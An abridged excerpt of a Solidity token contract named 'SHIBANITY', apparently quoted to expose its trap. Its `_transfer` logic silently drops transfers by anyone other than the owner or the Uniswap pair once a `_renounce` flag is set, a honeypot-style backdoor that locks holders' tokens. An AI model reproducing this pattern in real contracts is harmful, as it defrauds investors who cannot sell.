...
contract SHIBANITY is Context, IERC20, Ownable {
    ...
    string private constant _name = "SHIBANITY"; //
    string private constant _symbol = "SHIBANITY"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 3;
    address public  _marketingWallet = 0x3B24CcC729761fB5d034839E0937Db294E86bc47;
    bool public _renounce = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && _renounce){ return; }
